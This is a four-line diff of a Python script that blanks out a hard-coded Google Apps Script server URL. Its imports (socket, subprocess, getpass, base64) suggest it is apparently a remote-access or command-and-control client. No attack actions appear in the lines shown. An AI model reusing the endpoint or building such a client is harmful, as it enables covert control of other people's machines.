@@ -1,4 +1,4 @@
-srv=['https://script.google.com/macros/s/AKfycbxz0-5nlyuNgAwQwIu9aub0P9tCYZqMLtfrTSPWc9M7XTM-YGuQ/exec']
+srv=['']
 import sys,time,base64,socket,random,getpass,subprocess
 if sys.version_info.major==2:
  import urllib as parse
